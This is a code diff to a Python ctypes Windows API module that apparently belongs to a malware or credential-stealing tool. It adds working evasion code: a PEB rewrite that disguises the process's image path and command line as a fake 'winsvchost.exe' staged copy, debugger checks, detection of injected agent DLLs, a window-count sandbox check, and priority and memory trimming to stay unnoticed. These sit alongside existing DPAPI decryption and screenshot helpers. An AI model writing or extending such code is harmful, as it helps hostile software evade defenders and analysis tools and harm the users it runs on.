@@ -268,6 +268,8 @@ MONITORENUMPROC = _WINFUNCTYPE(
     wintypes.LPARAM,
 )
 
+ENUMWINDOWSPROC = _WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
+
 
 # --- library handles ----------------------------------------------------------
 
@@ -277,12 +279,22 @@ if _WINDOWS:
     _user32 = ctypes.WinDLL("user32", use_last_error=True)
     _iphlpapi = ctypes.WinDLL("iphlpapi", use_last_error=True)
     _crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
+    # ntdll carries the process-information query the PEB mask needs, and there is no
+    # kernel32 wrapper for it. shcore carries per-monitor DPI, which user32's
+    # GetDpiForWindow cannot answer for a monitor no window is on.
+    _ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+    try:
+        _shcore = ctypes.WinDLL("shcore", use_last_error=True)
+    except OSError:  # pragma: no cover - Windows 7 shape, never the target
+        _shcore = None
 else:  # pragma: no cover - exercised by the Linux import test
     _k32 = None
     _advapi32 = None
     _user32 = None
     _iphlpapi = None
     _crypt32 = None
+    _ntdll = None
+    _shcore = None
 
 
 def _declare() -> None:
@@ -460,6 +472,56 @@ def _declare() -> None:
         ctypes.POINTER(wintypes.DWORD),
     ]
     _k32.VirtualProtect.restype = wintypes.BOOL
+
+    _k32.GetModuleFileNameW.argtypes = [wintypes.HMODULE, wintypes.LPWSTR, wintypes.DWORD]
+    _k32.GetModuleFileNameW.restype = wintypes.DWORD
+
+    _k32.GetCurrentProcess.argtypes = []
+    _k32.GetCurrentProcess.restype = wintypes.HANDLE
+
+    _k32.IsDebuggerPresent.argtypes = []
+    _k32.IsDebuggerPresent.restype = wintypes.BOOL
+
+    _k32.CheckRemoteDebuggerPresent.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.BOOL)]
+    _k32.CheckRemoteDebuggerPresent.restype = wintypes.BOOL
+
+    ENUMWINDOWSPROC = _WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
+    _user32.EnumWindows.argtypes = [ENUMWINDOWSPROC, wintypes.LPARAM]
+
+    _k32.GetCurrentThread.argtypes = []
+    _k32.GetCurrentThread.restype = wintypes.HANDLE
+
+    _k32.SetThreadPriority.argtypes = [wintypes.HANDLE, ctypes.c_int]
+    _k32.SetThreadPriority.restype = wintypes.BOOL
+
+    _k32.SetPriorityClass.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+    _k32.SetPriorityClass.restype = wintypes.BOOL
+
+    _k32.SetProcessWorkingSetSize.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_size_t,
+        ctypes.c_size_t,
+    ]
+    _k32.SetProcessWorkingSetSize.restype = wintypes.BOOL
+
+    _ntdll.NtQueryInformationProcess.argtypes = [
+        wintypes.HANDLE,
+        wintypes.ULONG,
+        wintypes.LPVOID,
+        wintypes.ULONG,
+        ctypes.POINTER(wintypes.ULONG),
+    ]
+    _ntdll.NtQueryInformationProcess.restype = ctypes.c_long
+
+    if _shcore is not None:
+        _shcore.GetDpiForMonitor.argtypes = [
+            wintypes.HANDLE,
+            ctypes.c_int,
+            ctypes.POINTER(wintypes.UINT),
+            ctypes.POINTER(wintypes.UINT),
+        ]
+        _shcore.GetDpiForMonitor.restype = ctypes.c_long
+
 
     _crypt32.CryptUnprotectData.argtypes = [
         ctypes.POINTER(DATA_BLOB),
@@ -1268,6 +1330,430 @@ def crypt_unprotect(blob: bytes) -> bytes | None:
         _k32.LocalFree(ctypes.cast(data_out.pbData, wintypes.HLOCAL))
 
 
+# --- this process -------------------------------------------------------------
+# Three operations that change how the process looks rather than what it does: how hard
+# the scheduler pushes it, how much of it stays resident, and the name the process list
+# reads. All three are best-effort and return a value instead of raising, because every
+# one of them is cosmetic to the run and a failure is a line in the log, not an abort.
+#
+# The PEB rewrite is the only one that can corrupt memory if it is wrong, so it is built
+# the other way round from the usual recipe: rather than write at fixed offsets, it
+# scans for a UNICODE_STRING-shaped triple whose text matches this process's own image
+# path, and writes only when it found one. A block that grew a member between Windows
+# releases produces "no match" and no write, never a pointer overwritten with a string.
+
+_THREAD_PRIORITY_BELOW_NORMAL: Final[int] = -2
+_BELOW_NORMAL_PRIORITY_CLASS: Final[int] = 0x00004000
+_MDT_EFFECTIVE_DPI: Final[int] = 0
+
+# The scan window covers the standard input handles through the environment pointer.
+# It starts past ``MaximumLength``/``Length``/``Flags``/``DebugFlags`` and ends before
+# the console mode buffers, so it cannot accidentally read a console handle as a
+# string length.
+_PARAMS_SCAN_START: Final[int] = 0x38
+_PARAMS_SCAN_END: Final[int] = 0x128
+
+
+def lower_thread_priority() -> bool:
+    """Drop the calling thread to below normal. True when the kernel agreed."""
+    if not _WINDOWS:
+        return False
+    if not _k32.SetThreadPriority(_k32.GetCurrentThread(), _THREAD_PRIORITY_BELOW_NORMAL):
+        log.logger.debug("SetThreadPriority -> %d", ctypes.get_last_error())
+        return False
+    return True
+
+
+def lower_priority() -> bool:
+    """Drop the whole process to below normal, so a collection never competes."""
+    if not _WINDOWS:
+        return False
+    if not _k32.SetPriorityClass(_k32.GetCurrentProcess(), _BELOW_NORMAL_PRIORITY_CLASS):
+        log.logger.debug("SetPriorityClass -> %d", ctypes.get_last_error())
+        return False
+    return True
+
+
+def trim_working_set() -> bool:
+    """Empty the working set. The pages fault back in if anything still needs them."""
+    if not _WINDOWS:
+        return False
+    # (SIZE_T)-1 for both bounds is the documented "trim as much as possible".
+    if not _k32.SetProcessWorkingSetSize(
+        _k32.GetCurrentProcess(), ctypes.c_size_t(-1), ctypes.c_size_t(-1)
+    ):
+        log.logger.debug("SetProcessWorkingSetSize -> %d", ctypes.get_last_error())
+        return False
+    return True
+
+
+def module_file_name() -> str | None:
+    """The full path of the running image, as the loader knows it."""
+    if not _WINDOWS:
+        return None
+    buffer = ctypes.create_unicode_buffer(1024)
+    written = int(_k32.GetModuleFileNameW(None, buffer, 1024))
+    if written <= 0:
+        log.logger.debug("GetModuleFileNameW -> %d", ctypes.get_last_error())
+        return None
+    return buffer.value
+
+
+def monitor_dpi() -> dict[str, tuple[int, int]]:
+    """Device name -> (horizontal, vertical) DPI. Empty when shcore refuses.
+
+    ``GetDpiForMonitor`` with ``MDT_EFFECTIVE_DPI`` is the number Explorer uses for
+    scaling, so it is the number that explains a 1920-wide screenshot on a 4K panel.
+    """
+    found: dict[str, tuple[int, int]] = {}
+    if not _WINDOWS or _shcore is None:
+        return found
+
+    def callback(
+        hmonitor: int,
+        hdc: int,
+        rect: ctypes.POINTER(RECT),
+        data: int,
+    ) -> bool:
+        info = MONITORINFOEXW()
+        info.cbSize = ctypes.sizeof(MONITORINFOEXW)
+        if not _user32.GetMonitorInfoW(hmonitor, ctypes.byref(info)):
+            return True
+        horizontal = wintypes.UINT(0)
+        vertical = wintypes.UINT(0)
+        status = int(
+            _shcore.GetDpiForMonitor(
+                hmonitor, _MDT_EFFECTIVE_DPI, ctypes.byref(horizontal), ctypes.byref(vertical)
+            )
+        )
+        if status == 0:
+            found[str(info.szDevice)] = (int(horizontal.value), int(vertical.value))
+        return True
+
+    procedure = MONITORENUMPROC(callback)
+    _user32.EnumDisplayMonitors(None, None, procedure, 0)
+    return found
+
+
+class UNICODE_STRING(ctypes.Structure):
+    _fields_ = [
+        ("Length", wintypes.USHORT),
+        ("MaximumLength", wintypes.USHORT),
+        ("Buffer", ctypes.c_void_p),
+    ]
+
+
+class PROCESS_BASIC_INFORMATION(ctypes.Structure):
+    _fields_ = [
+        ("ExitStatus", ctypes.c_long),
+        ("PebBaseAddress", ctypes.c_void_p),
+        ("AffinityMask", ctypes.c_size_t),
+        ("BasePriority", ctypes.c_long),
+        ("UniqueProcessId", ctypes.c_size_t),
+        ("InheritedFromUniqueProcessId", ctypes.c_size_t),
+    ]
+
+
+def _peb() -> int | None:
+    if not _WINDOWS:
+        return None
+    information = PROCESS_BASIC_INFORMATION()
+    returned = wintypes.ULONG(0)
+    status = int(
+        _ntdll.NtQueryInformationProcess(
+            _k32.GetCurrentProcess(),
+            0,  # ProcessBasicInformation
+            ctypes.byref(information),
+            ctypes.sizeof(information),
+            ctypes.byref(returned),
+        )
+    )
+    if status != 0 or not information.PebBaseAddress:
+        return None
+    return int(information.PebBaseAddress)
+
+
+def _process_parameters(peb: int) -> int | None:
+    """``RTL_USER_PROCESS_PARAMETERS`` out of the PEB, validated before it is trusted."""
+    pointer_size = ctypes.sizeof(ctypes.c_void_p)
+    offset = 0x20 if pointer_size == 8 else 0x10
+    try:
+        raw = ctypes.string_at(peb + offset, pointer_size)
+    except (ValueError, OSError):
+        return None
+    address = int.from_bytes(raw, "little")
+    if address < 0x10000:
+        return None
+    try:
+        maximum, length = (
+            int.from_bytes(ctypes.string_at(address + 0, 2), "little"),
+            int.from_bytes(ctypes.string_at(address + 4, 2), "little"),
+        )
+    except (ValueError, OSError):
+        return None
+    if length == 0 or maximum < length or maximum > 0x10000:
+        return None
+    return address
+
+
+def _unicode_at(address: int) -> tuple[str, int, int] | None:
+    """Read a UNICODE_STRING. Returns ``(text, length, maximum)`` when it is credible."""
+    try:
+        value = UNICODE_STRING.from_buffer_copy(
+            ctypes.string_at(address, ctypes.sizeof(UNICODE_STRING))
+        )
+    except (ValueError, OSError):
+        return None
+    length = int(value.Length)
+    maximum = int(value.MaximumLength)
+    if length < 2 or length % 2 or length > 0x1000:
+        return None
+    if maximum < length or maximum > 0x1000:
+        return None
+    buffer = int(value.Buffer or 0)
+    if buffer < 0x10000:
+        return None
+    try:
+        text = ctypes.wstring_at(buffer, length // 2)
+    except (ValueError, OSError):
+        return None
+    if not text or "\x00" in text:
+        return None
+    return text, length, maximum
+
+
+def _find_string(
+    parameters: int, needle: str, *, prefix: bool
+) -> tuple[int, int, str, int] | None:
+    """First plausible triple in the parameters block whose text is ``needle``.
+
+    ``prefix`` is for CommandLine, which starts with the image path and then carries
+    arguments. Identity is the image path itself, so a field that happens to hold a
+    long wide string but not this executable cannot be matched by accident.
+    """
+    target = needle.casefold()
+    for offset in range(_PARAMS_SCAN_START, _PARAMS_SCAN_END, ctypes.sizeof(ctypes.c_void_p)):
+        found = _unicode_at(parameters + offset)
+        if found is None:
+            continue
+        text, length, maximum = found
+        folded = text.casefold()
+        if prefix:
+            # Strictly longer, and past a leading quote: the command line is either
+            # ``"path" args`` or ``path args``, and an exact match is the image field
+            # itself, which must not be rewritten twice.
+            trimmed = folded[1:] if folded.startswith('"') else folded
+            matched = trimmed.startswith(target) and len(trimmed) > len(needle)
+        else:
+            matched = folded == target
+        if matched:
+            return parameters + offset, length, text, maximum
+    return None
+
+
+def _write_protected(address: int, size: int, write: object) -> bool:
+    """Run ``write()`` with ``address`` made writable, then restore protection."""
+    previous = wintypes.DWORD(0)
+    if not _k32.VirtualProtect(
+        ctypes.c_void_p(address), size, PAGE_READWRITE, ctypes.byref(previous)
+    ):
+        log.logger.debug("mask: VirtualProtect -> %d", ctypes.get_last_error())
+        return False
+    try:
+        write()  # type: ignore[operator]
+    finally:
+        restored = wintypes.DWORD(0)
+        _k32.VirtualProtect(ctypes.c_void_p(address), size, previous.value, ctypes.byref(restored))
+    return True
+
+
+# Buffers handed to the PEB outlive every frame that touches them. A rewrite that has to
+# grow the string allocates here and never frees: sixty bytes in a process that exits in
+# minutes is cheaper than a realloc the loader does not expect.
+_PINNED: list[ctypes.Array[ctypes.c_wchar]] = []
+
+
+def _rewrite(field: int, text: str, old_length: int) -> bool:
+    """Point one UNICODE_STRING at ``text``. False when nothing could be written.
+
+    Two shapes. When the new text fits the existing allocation it is written in place and
+    the tail is zeroed, which leaves every other pointer in the block untouched. When it
+    does not fit, the string is allocated in this process and the sixteen-byte structure
+    is repointed: the only write to the parameters block is the one that describes the
+    string, never a relocation of a loader-owned buffer.
+    """
+    try:
+        value = UNICODE_STRING.from_buffer_copy(
+            ctypes.string_at(field, ctypes.sizeof(UNICODE_STRING))
+        )
+    except (ValueError, OSError):
+        return False
+    encoded = text.encode("utf-16-le", "replace")
+    if not encoded:
+        return False
+
+    maximum = int(value.MaximumLength)
+    buffer = int(value.Buffer or 0)
+
+    if buffer >= 0x10000 and len(encoded) <= maximum:
+
+        def in_place() -> None:
+            ctypes.memmove(buffer, encoded, len(encoded))
+            # The tail is zeroed so anything that reads to MaximumLength sees the end of
+            # the string rather than the remains of the path that used to be there.
+            remainder = min(old_length, maximum) - len(encoded)
+            if remainder > 0:
+                ctypes.memset(buffer + len(encoded), 0, remainder)
+
+        def set_length() -> None:
+            ctypes.cast(ctypes.c_void_p(field), ctypes.POINTER(wintypes.USHORT))[0] = len(encoded)
+
+        if not _write_protected(buffer, max(maximum, len(encoded)), in_place):
+            return False
+        return _write_protected(field, ctypes.sizeof(UNICODE_STRING), set_length)
+
+    pinned = ctypes.create_unicode_buffer(text)
+    _PINNED.append(pinned)
+    described = UNICODE_STRING(len(encoded), len(encoded), ctypes.addressof(pinned))
+
+    def repoint() -> None:
+        ctypes.memmove(field, ctypes.byref(described), ctypes.sizeof(UNICODE_STRING))
+
+    return _write_protected(field, ctypes.sizeof(UNICODE_STRING), repoint)
+
+
+def mask_process_image(name: str) -> dict[str, object]:
+    """Present ``name`` as this process's image and command line. Best effort, recorded.
+
+    The path keeps its directory: ``%LOCALAPPDATA%\\Programs\\WinSvcHost\\winsvchost.exe``
+    becomes ``...\\<name>``, which is what the staged copy on disk is called. The PEB is
+    a display string, so a name that does not exist on disk is not a contradiction, but a
+    name in a directory that does not exist reads as a forgery to anything looking.
+    """
+    result: dict[str, object] = {"image": False, "command": False, "reason": ""}
+    if not _WINDOWS:
+        result["reason"] = "not windows"
+        return result
+    if not name.strip():
+        result["reason"] = "no name"
+        return result
+
+    actual = module_file_name()
+    peb = _peb()
+    if actual is None or peb is None:
+        result["reason"] = "no peb"
+        return result
+    parameters = _process_parameters(peb)
+    if parameters is None:
+        result["reason"] = "no parameters"
+        return result
+
+    wanted = str(Path(actual).with_name(name))
+
+    found = _find_string(parameters, actual, prefix=False)
+    if found is not None and _rewrite(found[0], wanted, found[1]):
+        result["image"] = True
+
+    line = _find_string(parameters, actual, prefix=True)
+    if line is not None:
+        field, length, text, _maximum = line
+        quoted = text.startswith('"')
+        body = text[1:] if quoted else text
+        tail = body[len(actual) :]
+        # The quote that closed the old path is ours now: it is re-emitted in front of
+        # the tail, so leaving it attached would produce ``"path"" -args``.
+        if quoted and tail.startswith('"'):
+            tail = tail[1:]
+        rewritten = f'"{wanted}"{tail}' if quoted else f"{wanted}{tail}"
+        if _rewrite(field, rewritten, length):
+            result["command"] = True
+
+    if not result["image"] and not result["command"]:
+        result["reason"] = "no match"
+        log.logger.debug("mask: PEB scan found no image path")
+    return result
+
+
+_DPI_AWARENESS_DONE: Final[list[bool]] = []
+
+
+def enable_dpi_awareness() -> bool:
+    """Per-monitor-v2 awareness. Idempotent; True when the process is aware.
+
+    Without this a 150% display presents a 1706-wide desktop to a process that thinks it
+    is 2560: the screenshot comes back upscaled, and every monitor rectangle in
+    ``monitors()`` disagrees with the pixels under it. It must run before the first
+    enumeration, so entry calls it before anything else touches the display.
+    """
+    if not _WINDOWS:
+        return False
+    if _DPI_AWARENESS_DONE:
+        return True
+
+    aware = False
+    # -4 is DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2. The context values are negative
+    # small integers dressed as handles, so they are wrapped as pointer-sized unsigned.
+    mask = (1 << (8 * ctypes.sizeof(ctypes.c_void_p))) - 1
+    try:
+        function = _user32.SetProcessDpiAwarenessContext
+        function.argtypes = [ctypes.c_void_p]
+        function.restype = wintypes.BOOL
+        aware = bool(function(ctypes.c_void_p(-4 & mask)))
+    except AttributeError:  # pragma: no cover - pre-1703 Windows
+        aware = False
+    if not aware:
+        try:
+            aware = bool(_user32.SetProcessDPIAware())
+        except AttributeError:  # pragma: no cover
+            aware = False
+
+    _DPI_AWARENESS_DONE.append(aware)
+    log.logger.debug("dpi awareness: %s", aware)
+    return aware
+
+
+def debugger_present() -> dict[str, bool]:
+    """``{"local": .., "remote": ..}``. Either one true is a debugger."""
+    if not _WINDOWS:
+        return {"local": False, "remote": False}
+    local = bool(_k32.IsDebuggerPresent())
+    remote = wintypes.BOOL(False)
+    attached = bool(
+        _k32.CheckRemoteDebuggerPresent(_k32.GetCurrentProcess(), ctypes.byref(remote))
+    )
+    return {"local": local, "remote": bool(attached and remote.value)}
+
+
+def module_present(name: str) -> bool:
+    """True when ``name`` is loaded in this process. Used for injected agent DLLs."""
+    if not _WINDOWS or not name:
+        return False
+    return bool(_k32.GetModuleHandleW(name))
+
+
+def window_count() -> int:
+    """Visible top-level windows that carry a title.
+
+    A bare desktop is the cheapest sandbox tell there is: an analysis host boots to a
+    login and runs the sample with nothing on screen, where a real desktop has a shell,
+    a browser or a chat window with a caption on it.
+    """
+    if not _WINDOWS:
+        return 0
+    total = [0]
+
+    def callback(hwnd: int, data: int) -> bool:
+        if not _user32.IsWindowVisible(hwnd):
+            return True
+        if int(_user32.GetWindowTextLengthW(hwnd)) > 0:
+            total[0] += 1
+        return True
+
+    procedure = ENUMWINDOWSPROC(callback)
+    _user32.EnumWindows(procedure, 0)
+    return total[0]
+
+
 __all__ = [
     "HKEY_CURRENT_USER",
     "HKEY_LOCAL_MACHINE",
@@ -1284,13 +1770,21 @@ __all__ = [
     "copy_shared",
     "create_mutex",
     "crypt_unprotect",
+    "debugger_present",
     "disk_total_bytes",
+    "enable_dpi_awareness",
     "enum_firmware_tables",
     "firmware_table",
     "first_physical_mac",
     "load_library",
+    "lower_priority",
+    "lower_thread_priority",
+    "mask_process_image",
     "memory_status",
+    "module_file_name",
     "module_handle",
+    "module_present",
+    "monitor_dpi",
     "monitors",
     "native_system_info",
     "proc_address",
@@ -1302,7 +1796,9 @@ __all__ = [
     "registry_set_string",
     "registry_value",
     "smbios_type1",
+    "trim_working_set",
     "uptime_ms",
     "user_name",
     "virtual_protect",
+    "window_count",
 ]
